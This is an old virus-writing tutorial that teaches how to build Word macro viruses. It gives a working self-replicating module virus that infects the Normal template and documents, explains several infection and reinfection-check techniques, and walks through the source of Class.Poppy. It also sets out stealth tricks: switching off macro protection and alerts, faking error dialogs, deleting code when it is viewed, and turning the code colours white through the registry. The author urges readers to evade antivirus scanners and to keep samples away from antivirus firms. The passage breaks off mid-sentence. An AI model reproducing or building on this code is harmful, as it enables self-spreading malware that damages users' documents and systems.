<b>.Introduction to Word macros</b>

    Finally we start here...hehe...well what can I say? Word macros are the
most common sort of macros. You need to know that Word has a template where
you can store your personal setting, etc.  and of course your macros.  This
template gives you some kind of resistance in Word.  So if your macro is in
the active document, for infection it first checks if it is not already in-
stalled in the  template and infects it.  If  it is already in the template
nothing  will happen.  If the template  carries our  macro it checks if the
document is  already infected  and if not  it infects it.  This is the main
activity of a macro bug. Of course there can also be a payload or whatever,
but more on this later.

    In Word you have much more control over the program as in any other one
of the Office package.  You can change complete menu function,  for example
to show a message  box when you open a document or whatever.  Nearly every-
thing is possible in Word. You have also complete access to the registry!!!

    Ok, before we go to the next chapter, start Word and press 'ALT + F11'.
You are now in the Editor of Word.  Excel and PowerPoint have the same one.
Top left you will see the project explorer, if not press 'CTRL + R' to open
it. Now you see two things in: First the 'Normal'-project and the 'Project'
-project.  Doubleclick on the second one  to open the tree of the VBProject
of the document.  You see now 'Microsoft Word Objects'.  There is the class
stored that comes  with every Word document.  In this class object nowadays
all macros are coded,  but first we start with the  basics so now to  add a
module now,  right click on 'Project' - project and 'Insert -&gt; Module'. Now
we have a module added!  Bwaha,  let us start with some coding for you!  If
you have coded VB before go to the next chapter, else read on.

    Double click on the new added module. Place the cursor in the big right
window. Now type in:

	Sub MyFirstVBAProcedure()
	
		Msgbox "Heya, you are coding VBA!"

	End Sub

    Place the cursor within the procedure and press 'F5'. This command will
start the debugger. Take  look at this nice message box and play a bit with
that and take a look on the syntax. Next we will do another example:

	Sub MySecondVBAProcedure()

		With Assistant.NewBalloon
		    .Icon = msoIconAlert
		    .Animation = msoAnimationGetArtsy
		    .Heading = "Attention!"
		    .Text = "Today I turn into a martian!"
		    .Show
		End With

	End Sub

     This little  procedure will  show you the nice assistant of Office. Ok
play a bit with this two procedures and then continue with our guide!


<b>.The 'Word' basics</b>

    Phew .. you finally reached the basics...well kewl that you are reading
now this  here.  Let's  start.  First install  the Word help  file for VBA,
because it will be a good reference for you. It contains a lot of examples.
If you are not sure about a command, place the cursor on it and press 'F1'.
This will start the  help for this command.  Ok some of the basic  commands
are:


	On Error Resume Next

    This  command takes care about  all errors that could  happen while our
macro is executed.  If an error happens,  VBA will try to  execute the next
command in our macro. 


	Options.VirusProtection = False

   Have you ever opened a document which contains a macro? Did you see this
dialog box which asks you if you want to activate the macros?  This command
turns this dialog box off. We need this command that our macro does not get
the  attention of the victim  and that he does  not realize  that  all  his
documents are infected with your macro bug. So this command is really basic
every macro virus use it. The next command is also a very very common one.


	Options.SaveNormalPrompt = False

   As you already heard there is a template in word which we want to infect
and for that we change the  template so it needed to be saved.  If the user
now closes Word after our  macro has infected him,  Word asks him to prompt
the changes in the template.  'Normal' users won't  think about a virus but
it is better to avoid as much as unnormal actions in Word.  So this command
turns off the prompting.  If the user exits Word the template will be saved
without prompting, otherwise Word would ask.


	Application.EnableCancelKey =  wdCancelDisabled

     First you have to know that you can stop the execution of any macro by
pressing ESC. So if the user does this, our macro will show errors and that
is not good. Use this little command to disable the ESC key. So there is no
bypass key anymore until you deactivate this option again.


	Application.DisplayAlerts = wdAlertsNone

  This command turns off any alerts. If something not common happens really
nothing will happen. This command will be active until you deactivate it.


	Application.DisplayStatusBar = False

    While you are coding and coding  you will always see that the statusbar
in Word shows what you do,  like when you save the document after infection
the statusbar will show the saving process. To avoid it, we make the status
bar invisible. So our macro won't get the users attention.


      Application.ScreenUpdating = False

    This command will disable the screen updating and speed up our macro.


    All commands you see here  have one purpose,  to avoid to get the close
attention of the  user.  What's the use  when your  macro gets  immediately
detected by the user? Damn, nothing will happen.  This commands help you to
spread and increase lifetime of your virus. All this commands are also used
in nearly every macro,  so if you look at  source codes you  will find this
commands. There is only one problem for you. This commands are scan strings
for virus scanner so you have  to use kind of anti heuristics which will be
explained later.  If you don't know what  scan strings are  here is a short
description:  Virus scanners,  especially for macro,  search the macro code
for common virus commands like the ones above.  If the scanner finds two or
more it detects your macro as a virus,  but there are a  few tricks to fool
the scanners. ;)

    Here is now a little simple graphic to explain you the way of a macro.

  .------------.       .------------.
  |  Document  |       |  Template  |       A  document  infected  with our
  .------------.  ---&gt; `------------´       macro and a  'clean'  template.
  |   Macro    |                            Now  the  macro  stored  in the
  `------------´                            document  trys  to  infect  the
                                            template.  First  it  checks if
                                            it is already  installed if not
                                            install!

  .------------.        .-----------.
  |  Document  |        |  Template |       Our macro infected document has
  .------------.  ---&gt;  .-----------.       now infected the template. Both
  |   Macro    |        |   Macro   |       contain now the virulant macro.
  `------------´        `-----------´       


   The same what you see here will happen if the template infects a 'clean'
document but in the other way round. Just exchange the names in the graphic
or do your own...;) j/k.


<b>.Infection hooks for Word</b>

    What the hell are infection hooks?  Infection hooks  are the thing that
make your macro execute  when the hook gets active.  In Word there are five
important hooks for module  and two special for class  but to this two more
later.  This hooks are triggers.  The code stored in  this hook gets active
when some special action happens.  This can be opening, closing a file, add
a new file, starting of Word and closing of Word.  Here are the five common
hooks:


	Sub AutoOpen()
	Sub AutoClose()
	Sub AutoNew()
	Sub AutoExec()*
	Sub AutoExit()*

	* This ones are used especially for the template


 -Sub AutoOpen()-

   Like the name says the code will be executed when the document is opened
or in template you open a document.  If the document is infected it trys to
infect the template while opening  and if the template  is infected it trys
to infect the opened document.  Maybe a bit confusing  but you will  get in
real soon.

 -Sub AutoClose()-

    It the same as AutoOpen but while closing. The code will be executed if
you close a file.

 -Sub AutoNew()-

    If a template is infected it will try  to infect also all new documents
you create.

 -Sub AutoExec() & Sub AutoExit()-

    This two are only used for the template. The first one gets active when
Word is started and the second one you exit Word. The best use this two for
payloads or whatever.


	Private Sub Document_Open()
	Private Sub Document_Close()
	
    This two are used for class infectors but more to them later.

    If you did  understand everything  until here,  I hope so,  we will now
start with our first macro bug!


<b>.The basic Word module macro</b>

    Heja, the time has arrived, finally a working macro .. hehe. First here
is the complete source code,  after that I walk  through the whole code and
explain every command. Have phun!

---[ code starts here ]----------------------------------------------------

Sub AutoClose()

On Error Resume Next

Application.DisplayAlerts = wdAlertsNone
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayStatusBar = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False

Set Doc = ActiveDocument.VBProject.VBComponents
Set Tmp = NormalTemplate.VBProject.VBComponents

Const ExportSource = "c:\jackie.sys"
Const VirusName = "AIGTMV"

Application.VBE.ActiveVBProject.VBComponents(VirusName).Export ExportSource

For i = 1 To Tmp.Count
    If Tmp(i).Name = VirusName Then TmpInstalled = 1
Next i

For j = 1 To Doc.Count
    If Doc(j).Name = VirusName Then DocInstalled = 1
Next j

If TmpInstalled = 0 Then
    Tmp.Import ExportSource
    NormalTemplate.Save
End If

If DocInstalled = 0 Then
    Doc.Import ExportSource
    ActiveDocument.SaveAs ActiveDocument.FullName
End If

Msgbox "Word instructional macro by jackie", 0, "Word.APMP"

End Sub

---[ code ends here ]------------------------------------------------------

    If you didn't  understand something  it doesn't matters  because now we
will walk through every line of code.

---------------------------------------------------------------------------
Sub AutoClose()
---------------------------------------------------------------------------

    Every macro starts with a sub,  better called procedure. Like you heard
before the AutoClose is executed every  time a document gets closed.  So if
a document is infected with our macro it will try to infect the template if
you close it.

---------------------------------------------------------------------------
On Error Resume Next
---------------------------------------------------------------------------

    If some error happens  try to execute the next one.  It helps us not to
stuck in code if a command doesn't work.

---------------------------------------------------------------------------
Application.DisplayAlerts = wdAlertsNone
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayStatusBar = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
---------------------------------------------------------------------------

    Here you see the four basic  commands explained above.  The first turns
off the display of errors,  the second disables the cancel key,  the thirth
hides the status bar of Word, fourth turns off virus protection, last turns
off the prompting of saving  normal template.  This commands  take place in
99% of macro viruses.

---------------------------------------------------------------------------
Set Doc = ActiveDocument.VBProject.VBComponents
Set Tmp = NormalTemplate.VBProject.VBComponents
---------------------------------------------------------------------------

    Hmm .. the next one is a bit complicated for you  if you are a complete
newbie in programming. Ok, we need the object 'ActiveDocument.VBProject.VB-
Components'  often in our macro,  to save code we set this  object into the
variable  'Doc' . The same for the template.  This object  variables are no
need!  They are not necessary but if you want to save time and code use it.

---------------------------------------------------------------------------
Const ExportSource = "c:\jackie.sys"
Const VirusName = "AIGTMV"
---------------------------------------------------------------------------

    Here we set two constants  that stay the  same in the whole macro.  The
first one is the source file for the  export of our virus code.  The second
one is the name  of the  module that we are using.  We always  stay in this
module so the name won't change. Short...is the name of the module.

---------------------------------------------------------------------------
Application.VBE.ActiveVBProject.VBComponents(VirusName).Export ExportSource
---------------------------------------------------------------------------

    This command exports the content of the virus module.  The code will be
saved in the  file set in the constant  'ExportSource'.  This means for our
macro that all macro code will be stored in 'c:\jackie.sys'.

---------------------------------------------------------------------------
For i = 1 To Tmp.Count
    If Tmp(i).Name = VirusName Then TmpInstalled = 1
Next i
---------------------------------------------------------------------------

    This nice little for ... next loop checks if our virus  has already in-
fected the  normal template.  First make a loop from  one to the  number of
Visual Basic components in the template.  Compare if the name of the actual
component is the same as our macros. If yes set the variable 'TmpInstalled'
true. If not make the next loop.

---------------------------------------------------------------------------
For j = 1 To Doc.Count
    If Doc(j).Name = VirusName Then DocInstalled = 1
Next j
---------------------------------------------------------------------------

    Like you see this is the same as  above but to check if the document is
already infected.

---------------------------------------------------------------------------
If TmpInstalled = 0 Then
    Tmp.Import ExportSource
    NormalTemplate.Save
End If
---------------------------------------------------------------------------

    If we are not installed in  the normaltemplate  then first  import  our
virus from  the sourcecode file  'c:\jackie.sys'  then after that save  the
changes in the template.  This lines will not be executed if we are already
installed!

---------------------------------------------------------------------------
If DocInstalled = 0 Then
    Doc.Import ExportSource
    ActiveDocument.SaveAs ActiveDocument.FullName
End If
---------------------------------------------------------------------------

    Same as the installation for the template but with one change.  We save
the document as it's full name. So Word won't ask for the name.  If it is a
new document it will be save as 'Doc1.doc' ex. If it has been already saved
it will be saved under it's original name.

---------------------------------------------------------------------------
Msgbox "Word instructional macro by jackie", 0, "Word.APMP"
---------------------------------------------------------------------------

    Hehe ... this is our little payload.  It just pops up a little box with
the above contents.

---------------------------------------------------------------------------
End Sub
---------------------------------------------------------------------------

    As you  heard a macro starts with  'Sub .... ()'  and now  it ends with
'End Sub'. Every sub does this...hehe.


    So this is your first macro bug now. This is a very very poor macro, no
stealth, etc ... only for the purpose of this tutorial ... hehe. Try it and
play a bit with the code, it is a fully working macro bug!  Like you see it
is really no big problem to write such little macros.  If you didn't under-
stood something read it again (hehe) and continue then with the guide.


<b>.Infection technics for Word</b>

    In this chapter of our guide we will take a close look on the different
infection and checking  routines.  It is very important to find always some
kind of new infection technics because  the Antivirus scene does not sleep!
First I will explain the very common import/export method.  There are older
ones, but the don't work under SR-1 anymore. ( SR-1 was the service release
of microsoft to stop the macro viruses ).

<b>
 .Import/Export</b>

This method was the first technic discovered after the release of SR-1. Hmm
VicodinES was the one who wrote the first SR-1 compatible,  just to mention
the guy who did the most for macro coding scene.(Hi Mr.Vic, where are you?)
The concept is,  to export (write) our source code into an external file on
the hd and then on infection, when we need the source code again, import it
from this file. See the example code:

 ActiveDocument.VBProject.VBComponents("jackie").Export "c:\jackie.sys"

This command  will save the whole code in the component  'jackie'  into the
file 'c:\jackie.sys'. Later we use this command to import (read) the source
code from the file again.

 NormalTemplate.VBProject.VBComponents.Import "c:\jackie.sys"

What you think?  This command  imports our source code.  The VBA enviroment
will automatically create a module called 'jackie' and import our code then
in this component.  This method is nearly used in every module macro virus.
Nowadays there are nearly no module macros anylonger, because nearly every-
one writes class macros. More on this later.


<b> .Add From File</b>

First to the infection  technic which is used by class macros.  This one is
taken  from  the very first  class object  infector,  written by VicodinES.
First we export the source code into an external file.

 ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"

This command exports the code of the class  object ('ThisDocument') of Word
into the file 'c:\class.sys'. Notice that

 ActiveDocument.VBProject.VBComponents(1).Export "c:\class.sys"

would have the same result. Also notice that '1' is always the class module
'ThisDocument'.  Ok we have now the code exported to an external file.  For
the infection of a class object we  need to import it into the class object
again. This is done by this command

 NormalTemplate.VBProject.VBComponents(1).CodeModule _
  .AddFromFile "c:\class.sys"

This command inserts our viral code  into the class  object of the template
in Word,  but there is a problem  which is solved easily.  When you compare
the two exported files,  'jackie.sys' and 'class.sys', you will see that in
the class file Word will add four internal  lines which will be imported on
infection.  So we need to delete these four lines.  Use this command to cut
them

 NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1,4
 
This command will delete the first four lines which we don't need. That you
see what I mean if have here the four lines which will be added to the code
automatically.

 VERSION 1.0 CLASS
 BEGIN
   MultiUse = -1  'True
 END

We don't need this lines, they will only force an error, so we delete them.

<b>
.Add From String/Insert Lines</b>

Let's take a look at another  infection technic,  which I use in general in
my macro bugs. First we save the whole viral code in a variable and then we
add our code to the template/document through this string variable.  Take a
look at this command, which saves the whole code from line one to twenty in
the variable 'OurCode'

 OurCode = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1,20)

Ha, you know what 'ThisDocument' means? Na? Well it refers to the template/
document, in which the current code is located. So you don't have to choose
where the code is located,  Word does it for you.  You can also use instead

 OurCode = MacroContainer.VBProject.VBComponents(1).CodeModule.Lines(1,20)

which would have the same effect, MacroContainer is similar to ThisDocument
just use what you like better. In the bracket after 'Lines' you have to put
the number of lines you  want to store into the variable.  The first number
is the line in which we start,  normaly line number one.  The second one is
how many lines.  So in our case,  the code from line one  until line twenty
will be saved in variable ' OurCode '. So now we need to add this code into
our target to infect. Use this command

 NormalTemplate.VBProject.VBComponents(1).CodeModule.AddFromString OurCode

to add our code to the class object of normal template. Another command and
the same effect would be

 NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, OurCode

which would insert all the code in the variable in the first line of normal
template's class object.  Whatever, use the command you like better. If you
don't understand a thing,  just re-read it and when you will come away from
theory you will understand it. Now we come to a more or less important part
of macro bugs, the stealth.

    Well, now we take a look on the methods or technics we can check if our
macro virus is already present.  First for module infection we can check if
our module is present.  This can be done with a few commands or routines. I
will show you here two different for modules. Well the first one we already
saw in our first macro bug in the last chapter. Use the following code.

 For x = 1 to Normaltemplate.VBProjects.VBComponents.Count
	If Normaltemplate.VBProject.VBComponents(x).Name = "Virus" Then _
       NormalInfected = True
 Next       

    As I explained in chapter 2.4 this piece of code does a for - next loop
from 1 to the number of Visual Basic components in the template of Word. So
use 'ActiveDocument' instead of 'Normaltemplate' to check the infection for
the document. If the name is equal to our name, 'Virus', then set our check
variable to 'True'.  Continue loop until last component.  Ok, next piece of
code is a bit smaller but has the same result. Let's see how it is done.

 If Len(Normaltemplate.VBProject.VBComponents("Virus").Name) = 0 Then _
  NormalInfected = True

    What we do here,  is to check the length of  the viral module  with the
name 'Virus'. If the length is zero then the component doesn't exist and we
set our check variable to 'True'. As you may can immagine the code to check
the document would just contain 'ActiveDocument'. Fine.

    As you see it is easy to check if we are infected, you may find another
method to check this, but this are the common ones. Well you have to remem-
ber that you HAVE to find new ones,  because AV community won't sleep!  ;-)
Ok, now we leave module infection checks alone and go on with class infect-
ion checking, which you will need later, but explained here.

    First method to check class  infection is to count  the number of lines
in template or document and see if the number is similar to our viral code.
This method was used in the first know class macro 'Class.Poppy'.  The code
to check this would be similar to this.

 If Normaltemplate.VBProject.VBComponents(1).CodeModule _
 .CountOfLines = 23 Then NormalInfected = True

    For the document, as you already may know ;-) just use 'ActiveDocument'
instead of 'Normaltemplate'. Another method to check for a previous infect-
ion is  to make a marker in your code.  In the following example we use the
string 'Marker' as our infection marker. Here is the code.

 If Normaltemplate.VBProject.VBComponents(1).CodeModule _
  .Lines(1,1) = "'Virus" Then NormalInfected = True

    Well, here we  check if the first line of  code in the class  module in
the template of Word is equal to our marker  ' Virus '. If it is we set our
check variable to 'True'. And of course you can put the marker in every li-
ne you want,  just change the settings then.  Again exchange the the object
to check for the document.

<b>
.Stealth technics for Word

 .Simple Stealth</b>

    Stealth, that on the menu today.  First a little  theory about stealth.
Like the name says, stealth helps that the user doesn't notice our presence
We can disable special stealth menus, etc.  There can be very basic, simple
Stealth, and much more advanced stealh. We will look first on the more easy
versions of stealth. In Word we can intercept the execution of some actions
like the activation of the  visual basic editor that we are working in.  So
if the user presses 'ALT+F11' we can intercept this.  Or we can disable the
menus in Word, but first a look on simple interception.  If you put these 2
lines into your code

 Sub ViewVBCode()
 End Sub

    you will intercept that the visual basic editor is  shown when the user
wants to take a look at some code. This will be noticed by the user, so you
can add some kind of error code into it, like

 Sub ViewVBCode()
  MsgBox "Unexcpected error",16
 End Sub

    to show  the user a fake  error message.  Just think for your own faked
error message. The important stealth menus for Word that you need to inter-
cept, are:


	ViewVBCode
	ViewCode
	ToolsMacro
	FileTemplates


<b> .ViewVBCode</b>

    This routine is called when the user presses 'ALT+F11' or clicks on the
menu entries.

<b> .ViewCode</b>

    Has the same function as first one, to disable the visual basic editor.
This one is executed if the user presses on the little icon on the toolbox.

<b> .ToolsMacro</b>

    The very basic stealth,  this routine is triggered  if the user presses
'ALT+F8' or clicks on Tools/Macro. In this popup window all macros are dis-
played,  except the ones in  the class  area.  Class macro have a so called
build in stealth.
<b>
 .FileTemplates</b>

    This routine is started if the user tries to organize the macros in the
template. Like in ToolsMacro, class macros won't be displayed.


    Next we will take a look on how to disable menus. This stealth more im-
portant for class macros than the interception of menus. In this method, we
disable the menu items. The command to disable the item 'Macro' in the menu
'Tools' would be

 CommandBars("Tools").Controls("Macro").Enabled = False

which will disable the menu. To be language independent use

 CommandBars("Tools").Controls(12).Enabled = False

This will  disalbe the twelved  item of the menu tools.  Just find out what
menu you want to disable. You can also delete the whole menu item with this

 CommandBars("Tools").Controls(12).Delete

The menu is then deleted remember not disabled!


    Now a look on more advanced  stealth.  There are a lot  of really great
stealth concepts,  some are easy but powerful,  some are more  complicated.
At least the have the same result, to help you to keep your macro unnoticed
by the infected user.

<b>
 .Advanced Stealth</b>

    Advanced Stealth,  first I must say that I never thought about advanced
in my creations,  because I think that a basic stealth is enough and for my
class viruses,  I never use any kind of stealth except of the build in one.
So I looked  around some source  codes from different writers,  and I found
here some  pretty good stealth technics.  I like to thank people  like Lord
Arz, who is retired from virus scene (We miss you! Good Luck in your doing)
or F0re, which did some great stealth technics for Word.

    First technic here is by Lord Arz, taken from W97M.Lizard. Theory: This
macro intercepts the execution of the macro dialog. If the user presses the
shortcut  'ALT+F8'  or clicks on the menu,  this routine first exports it's
code  into a temporary file called 'Lizard.bas' into the current directory.
Then  it deletes it's module  from the template of Word.  After that Lizard
displays  the Macro dialog and does a loop in code while the dialog is dis-
played. If the user closes the dialog again, the code will go on. After the
user closed it, Lizard imports itself again into the template. Then it del-
etes the temporary source code file.

 Sub ToolsMacro()

  NormalTemplate.VBProject.VBComponents("Lizard").Export "Lizard.bas"

Export the source into the file 'lizard.bas'...

  Application.OrganizerDelete NormalTemplate.FullName, "Lizard", _
      wdOrganizerObjectProjectItems

Delete 'Lizard' from the macros in the normal template...

  While Dialogs(wdDialogToolsMacro).Display
  Wend

Show the dialog and wait til it is closed again...

  NormalTemplate.VBProject.VBComponents.Import "Lizard.bas"

Import 'lizard' again...

  Kill "Lizard.bas"

Delete the source of lizard...

 End Sub

    As you see this is a good technic, but may you improve the code that it
also hides the macros  in the document if it is infected and the user wants
to see the dialog.  Just think a bit and you will find a way to do it. Just
change some commands :) Now some code which does also deleting, but not the
whole module, but it's code. This code was used in W97M/VBS.Bogus published
in LineZer0 Network Zine #1. There you can take a look on the whole source.
So, let us take a look at the code.

 Sub ViewVBCode()

 On Error Resume Next
 NormalTemplate.VBProject.VBComponents("yoz").CodeModule.DeleteLines 1, 167

This command here  deletes the  lines from  the module 'yoz'.  For using in
class infectors use '1' instead of 'yoz'.

 ActiveDocument.VBProject.VBComponents("yoz").CodeModule.DeleteLines 1, 167

Same as above but this time in the document.

 NormalTemplate.Saved = True
 ActiveDocument.Saved = True

These two commands are very important for this stealth. They tell Word that
the doc/temp is already saved.  So when you close it,  it won't ask you for
saving.

    If you use this technic,  you must hope that  the user will not save it
after  he looked at the code,  otherwise our code is lost.  May you improve
the first technic from Lizard that you can use it in your class object,  or
whatever. Ok, now the kewlest stealth I have ever seen, written by Lord Arz
and the code was also published in LineZer0 Network Zine #1.  This is a bit
more advanced. Simple with the biggest effect. When you look at your visual
basic editor,  you see that the font colour is black,  but what about if we
set this colour to white? Right the user won't see any code in! As you see,
there is no option in the editor,  so we have to access direct into windows
registry.  This is a gewd feature of Word, you can directly access the reg-
istry!


 System.PrivateProfileString("", _
  "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", _
  "CodeBackColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"    

Change the colour of code to white when it is selected.

 System.PrivateProfileString("", _
  "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", _
  "CodeForeColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"

Change the general colour of the code.


    I know that are lots of technics for stealth, but I never found it much
interessting so if you need stealth,  try to code your own perfect stealth.
I know that  there is less done in  stealth technics so maybe you will find
a good stealth technic, just use your immagination. At the end of this part
I just want to say,  the better your stealth, the longer your creation will
stay unnoticed. Be inspired by this technics.

<b>
.The basic Word class macro</b>

    Hi there, are you awake or sleeping?  Hope you are alive! ;)  So before
you continue with this part,  I recommend you to toy around with the module
infections first,  to get all  the basics.  Without them you  copy just the
code here and write a macro.  Kewl,  then you are one of those lamers which
gave macro  such a bad name,  just hacking other macros.  Try to understand
the basics then go on, use your immagination and write gewd macros!  If you
think  it's ok to write lack macros,  then FUCK YOU BURN THIS TUTORIAL!  VX
scene doesn't need such people,  but if you don't think it's ok to be lame,
then feel free and read on! You have to understand my reaction,  because if
you look at  www.avpve.com  into the macro  section you will see that there
are too much macros by lamers which sended there creation to AVP just to be
on the AVPVE site, fuck this lamers! Never forget, don't send your creation
to any AV firm! It's lame.  You don't want to be lame or? So read on to get
out of this phase.

    Ok, let's come now to the class infection. What is a class object? Easy
if you take a look at your visual basic editor,  then you will find a thing
called 'ThisDocument'. This is our class object. Every document or template
has this class inside, so it should be a kewl idea to infect such an object
or what you think? Before we start we will do some theory.  First you can't
have the  same public routines  in class objects.  If you have for example,
'Sub AutoOpen()' as a hook in the document, then you can't have this one in
the template.  You have to change it to  'Sub AutoClose()'  or whatever you
like.  As you see the term 'Sub ... ()' is public. To avoid this changes we
can use private routines or better say  'Subs' ,  but more on this later in
advanced class technics.  So now I have here  for you the  very first class
macro ever, borrowed from VicodinES, thanks! This is the code from the doc!

---[ code ends here ]------------------------------------------------------


    What you see is the first class object infector ever,  it has a message
as payload  and uses simple stealth.  May you wonder why there is only code
in every second line?  The answer is simple,  this is used by VSMP which is
Vic's Simple Macro Poly engine,  but more on this later.  If the code won't
be in every second line, the virus will crash. I will walk now step by step
through the whole code.

---------------------------------------------------------------------------
Sub AutoOpen()
---------------------------------------------------------------------------

    If you look back in this guide,  you will remember that this routine is
always executed when a document gets opened.  In our case, Class.Poppy, the
AutoOpen hook is used in the document code, so every document will have the
AutoOpen hook and every template the AutoClose hook, but more on this later
in code.

---------------------------------------------------------------------------
On Error GoTo out
---------------------------------------------------------------------------

   This is  the error handler,  if some  error happens,  the code below the
label 'out' will be executed.

---------------------------------------------------------------------------
Options.VirusProtection = False
---------------------------------------------------------------------------

    As I told in the basics,  this command will turn off the virus protect-
ion of Word on opening an infected document. If you don't remember read the
basics again.

---------------------------------------------------------------------------
Options.SaveNormalPrompt = False
---------------------------------------------------------------------------

    Again something from the basics. As I said, every macro virus uses such
commands.  This one is used to turn off the prompting for saving changes in
Normal.dot when closing Word.

---------------------------------------------------------------------------
Options.ConfirmConversions = False
---------------------------------------------------------------------------

    This command turns off the prompting for conversions in documents, like
language, saving format, etc.

---------------------------------------------------------------------------
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
---------------------------------------------------------------------------

    Save the number of lines in the class object of the active document in-
to the variable ' ad '.  We need this to check if we are already present in
the active document.  Same for the number of lines in the template, we just
save the number into the variable 'nt'.

---------------------------------------------------------------------------
If Day(Now) = 31 Then MsgBox "•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•" + _
Chr$(13) + "•  VicodinES /CB /TNN •" + Chr$(13) + _
"•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•", 0, "This Is Class"
---------------------------------------------------------------------------

    This here is one line, just delete the underscores ' _ '.  This line is
the payload of  Class.Poppy.  On every 31 day of the  current month it will
display a message box.

---------------------------------------------------------------------------
If nt = 0 Then
 
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
 
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
 
End If
---------------------------------------------------------------------------

    If there is no code in the class object  of the template then we set an
object variable called ' host ' to the class object of template. This means
that our new host will be the class object of the template. Then export our
viral code from the class object of document into the file  'c:\class.sys'.

---------------------------------------------------------------------------
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
---------------------------------------------------------------------------

    If there is no code  in the class  object of the document,  then we set
the object variable to the class object of the active document. It is clear
that we don't need to export the source, because if the code is in template
then we already exported our source on the first infection.

---------------------------------------------------------------------------
If nt &gt; 0 And ad &gt; 0 Then GoTo out
---------------------------------------------------------------------------

    If there is already code in both available class objects,  template and
document, the jump to our label 'out'. This means that the template and the
document could be already infected by a virus or whatever.

---------------------------------------------------------------------------
host.codemodule.AddFromFile ("c:\class.sys")
---------------------------------------------------------------------------

    If there is something to infect, we go on with this command, which will
insert the code from the exported file 'c:\class.sys'. Remember what I told
you about the four lines in exported code which we don't need?  The will be
imported now, so Class.Poppy deletes them with the following lines of code.

---------------------------------------------------------------------------
With host.codemodule
 
    For x = 1 To 4
 
    .deletelines 1
 
    Next x
 
End With
---------------------------------------------------------------------------

    This piece of code will delete the  first line of code  in our new host
four times. If you look back to the infection technics, you will find there
a shorter piece of code that has the same effect.

---------------------------------------------------------------------------
If nt = 0 Then
 
    With host.codemodule
 
    .replaceline 1, "Sub AutoClose()"
 
    .replaceline 69, "Sub ViewVBCode()"
    
    End With
 
End If
---------------------------------------------------------------------------

    Remember what I told you about public and private routines in class ob-
jects? Class.Poppy uses public routines, AutoOpen and AutoClose, so we need
to change them. As you see, if the number of lines in template is zero then
we have currently infected it and we need to change the first line, the sub
that our code won't crash.  We also have to change line  69,  where the our
stealth sub is located. I did this little graphic here for you that you can
understand better what I mean.

  .------------.        .-----------.  If a document infects a template,
  |  Document  |        |  Template |  then AutoOpen gets AutoClose and
  .------------.  ---&gt;  .-----------.  ToolsMacro gets ViewVBCode which
  |  AutoOpen  |        | AutoClose |  is our stealth. Both,  infection
  .------------.  &lt;---  .-----------.  and stealth, are public routines
  | ToolsMacro |        | ViewVBCode|  so our code will  crash if we do
  `------------´        `-----------´  not change it.

---------------------------------------------------------------------------
With host.codemodule
 
    For x = 2 To 70 Step 2
 
    .replaceline x, "'" & Application.UserName & Now &
      Application.ActivePrinter & Now
 
    Next x

End With
---------------------------------------------------------------------------

    This here is a polymorphic routine,  a very simple one,  but it was the
very first ever for macros.  As you see in the original  source code above,
every second line is empty. So this routine called  VSMP  does nothing else
then inserting junk code into every empty line,  but more on this engine in
the part about polymorphism.

---------------------------------------------------------------------------
out:
---------------------------------------------------------------------------
    
    Hey, this is our error label. On error the code below will be executed

---------------------------------------------------------------------------
If nt &lt;&gt; 0 And ad = 0 Then ActiveDocument.SaveAs ActiveDocument.FullName
---------------------------------------------------------------------------

    This is one line! So if the number of lines in the template is not zero
and the lines of code in document  was zero then it is logical that we just
have infected a document, so we need to save it under it's fullname.

---------------------------------------------------------------------------
End Sub
---------------------------------------------------------------------------

    No comment :)

---------------------------------------------------------------------------
Sub ToolsMacro()

End Sub
---------------------------------------------------------------------------

    Right, this is our stealth for the document.  It intercepts the display
of the macro dialog. In template this will get to 'Sub ViewVBCode()'.

    So may you wonder  why I choosed this one,  Class.Poppy,  the answer is
very easy. It was the very very first class macro ever! Written by Mr. Vic!
So every class macro that you find nowadays build on this first one. Thanks
VicodinES! Just toy around with this code until you understand how it works
then go on with the next chapter, more advanced class technics...

<b>
.Class macro advanced technics</b>

    After toying  around with the  basics of class  infection and infection
technics, we finally can go on with some more advanced class technics. I am
always on the look  out for new infection technics,  because they  are very
important. You will see that the ways of coding class have changed a bit. I
personally don't see any sense in coding a module macro for spreading nowa-
days, because modules can be scanned by their names. This doesn't mean that
module macros are bad, it's kewl cause you can realize better stealth tech,
but you learned the module macros here to understand the very basics of it.
Also this guide handles with every kind of macros! ;) So to learn about the
advanced technics, let us take a close look on some good source codes after
I explained some general things.


    First of all, it is much better to use private routines like I told you
on the infection hooks part. I am talking about these ones:

  Private Sub Document_New()
  Private Sub Document_Open()
  Private Sub Document_Close()

    This are the three available  private infection hooks for class macros.
Of course you can also use the AutoMacros but it is much better to use this
private ones.

 .Private Sub Document_New()

    Easy, this routine starts on  making a new document,  perfect to infect
every new document. Good in combo with Document_Open, but it is much better
to use only  Document_Close,  because it will have  the same result  as the
first ones together.

 .Private Sub Document_Open()

    On opening an  existing document,  our viral code in  this routine gets
very active ;)

 .Private Sub Document_Close()

    In my opinion  the best infection hook which is available for class in-
fections. It combines Open and New, because every opened or new document is
getting closed.

    These infection hooks  are all private,  so you don't  have to exchange
them in document or template.  They will  remain the same.  Here again some
graphic to explain it better.


  .---------------.        .---------------.  
  |    Document   |  ---&gt;  |    Template   |  As you see the hook remains
  .---------------.        .---------------.  the same in both,  document
  | Document_Open |  &lt;---  | Document_Open |  and template.
  `---------------´        `---------------´  

    The same counts for Open and New, the hook can remain without crashing.
If you need for example a second routine for payload, encryption, etc. then
